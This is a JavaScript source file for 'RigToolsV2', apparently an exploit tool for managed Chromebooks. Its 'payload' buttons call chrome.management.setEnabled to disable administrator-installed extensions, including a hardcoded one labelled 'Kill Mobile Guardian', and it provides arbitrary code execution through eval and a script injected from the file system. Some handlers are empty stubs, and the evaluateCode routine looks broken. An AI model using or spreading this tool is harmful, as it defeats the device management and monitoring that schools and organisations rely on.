// Alert on error
window.onerror = (msg) => alert(msg);

// HTML Templates
const uiTemplate = `
  <div id="chrome_management_disable_ext">
    <h1>RigToolsV2 - By Jobi#8313</h1>
    <h2>This is an add-on to the remake of RigTools by Appleflyer.</h2>
    <p>Note that this only works on extensions installed by your administrator.</p>
    <embed id="ltbeefwindow" style="border:5px solid black;"></embed>
    <br>
    <button id="runanything">Run Code</button>
    <br>
    <textarea id="codebox" style="width:500px;height:300px;"></textarea>
    <br>
    <button id="payload-1">P1 Test Payload</button>
    <button id="payload-2">P2 Kill Mobile Guardian (hardcoded id)</button>
    <button id="payload-3">P3 Kill Extension by ID (manual input)</button>
    <button id="payload-4">P4 Get Self ID and Alert</button>
    <button id="payload-5">P5 Kill Ext that's Running Injected Code</button>
    <button id="payload-6">P6 LTBeef (Remake by UniUB)</button>
  </div>
`;

const fileManagerPrivateTemplate = `
  <div id="fileManagerPrivate_cap">
    <div id="FMP_openURL">
      <button id="btn_FMP_openURL">Open URL in Skiovox window</button>
    </div>
  </div>
`;

// Function to retrieve installed extensions
function getExtensions(callback) {
  chrome.management.getAll((extensions) => {
    const extensionList = extensions.map((ext) => ({
      id: ext.id,
      name: ext.name,
      version: ext.version,
      description: ext.description,
      enabled: ext.enabled,
    }));
    callback(extensionList);
  });
}

// Display extensions in a new window
function displayExtensions(extensions) {
  const win = window.open();
  win.document.open();
  win.document.write(`
    <h1>chrome.management</h1>
    <h2>Made by Jobi#8313, this is ltbeef but for the RigTools exploit :D</h2>
    ${extensions
      .map(
        (ext) =>
          `<p>${ext.name} : ${ext.id}<input type='checkbox' ext='${ext.id}'></p>`
      )
      .join("")}
  `);
  win.document.close();
}

// Main function to run the extension logic
async function main() {
  if (chrome.fileManagerPrivate) {
    chrome.fileManagerPrivate.openURL("data:text/html,<h1>Hello</h1>");
    document.write(fileManagerPrivateTemplate);

    document.body.querySelector("#btn_FMP_openURL").onclick = function (ev) {
      // Handle button click for fileManagerPrivate
    };
  }

  if (chrome.management.setEnabled) {
    document.write(uiTemplate);
    document.close();
    const container = document.body.querySelector(
      "#chrome_management_disable_ext"
    );

    // Event listeners for payload buttons
    container.querySelector("#payload-1").onclick = () =>
      alert("JS works. P1 executed (nothing).");
    container.querySelector("#payload-2").onclick = async () => {
      alert("Payload 2 executed");
      chrome.management.setEnabled("fgmafhdohjkdhfaacgbgclmfgkgokgmb", false);
    };
    container.querySelector("#payload-3").onclick = async () => {
      const exttokill = prompt("Extension ID?");
      if (exttokill) {
        chrome.management.setEnabled(exttokill, false);
      }
    };
    container.querySelector("#payload-4").onclick = () =>
      alert(chrome.runtime.id);
    container.querySelector("#payload-5").onclick = async () => {
      chrome.management.setEnabled(chrome.runtime.id, false);
    };
    container.querySelector("#payload-6").onclick = async () => {
      getExtensions(displayExtensions);
    };
    container.querySelector("#runanything").onclick = () => {
      eval(document.getElementById("codebox").value);
    };
  }

  // Load Default Extension Capabilities
  new DefaultExtensionCapabilities().activate();
}

// Class for Default Extension Capabilities
class DefaultExtensionCapabilities {
  static template = `
    <div id="ext_default">
      <div id="default_extension_capabilities">
        <h1>Default Extension Capabilities</h1>
        <h2>Evaluate code</h2>
        <input type="text" id="code_input"/><button id="code_evaluate">Evaluate</button>
      </div>
      <div id="extension_tabs_default">
        <button id="tabreload">Refresh Tabs</button>
        <h1>Update Tabs</h1>
        <ol></ol>
        <input id="TabURLInput" /> <button id="TabURLSubmit">Create</button>
      </div>
    </div>
  `;

  activate() {
    document.write(DefaultExtensionCapabilities.template);
    document.close();

    // Button event listeners
    document
      .querySelector("#code_evaluate")
      .addEventListener("click", this.evaluateCode);
    document
      .querySelector("#tabreload")
      .addEventListener("click", this.updateTabList);
  }

  async evaluateCode() {
    const code = document.querySelector("#code_input").value;
    const url = await this.writeFile("src.js", code);
    const script = document.createElement("script");
    script.src = url;
    document.body.appendChild(script);
  }

  static async writeFile(file, data) {
    const fs = await new Promise((resolve) =>
      webkitRequestFileSystem(TEMPORARY, 2 * 1024 * 1024, resolve)
    );
    return new Promise((resolve, reject) => {
      fs.root.getFile(file, { create: true }, (entry) => {
        entry.createWriter((writer) => {
          writer.write(new Blob([data]));
          writer.onwriteend = () => resolve(entry.toURL());
        });
      });
    });
  }

  updateTabList() {
    // Implement tab list updating logic
  }
}

// Initialize the extension
window.onload = main;
